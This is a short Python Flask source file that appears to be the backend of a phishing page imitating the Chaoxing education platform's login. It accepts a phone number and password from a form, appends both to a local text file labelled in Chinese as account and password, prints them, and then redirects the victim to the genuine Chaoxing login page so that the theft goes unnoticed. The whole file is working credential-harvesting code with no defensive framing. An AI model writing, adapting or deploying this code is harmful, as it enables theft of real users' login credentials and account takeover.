from flask import Flask,render_template,request,redirect



root=Flask(__name__,template_folder='templates',static_folder='static')


@root.route('/')


def index():
    return render_template('index.html')
    
@root.route('/submit', methods=['POST'])
def submit():
  
  phone = request.form['phone']
  pwd = request.form['pwd']
  # 处理 phone 变量

  with open('日志.txt', 'a', encoding='utf-8') as t1:
  
    t1.write('账号：')
    t1.write(phone)
    t1.write('密码：')
    t1.write(pwd)
    t1.close()
  print('账号：',phone,'密码：',pwd)
 
 
  return redirect('https://passport2.chaoxing.com/mlogin?fid=&newversion=true&refer=http%3A%2F%2Fi.chaoxing.com')
  




if __name__ =='__main__':

    root.run(host="127.0.0.1", port=52200,  threaded=True)
    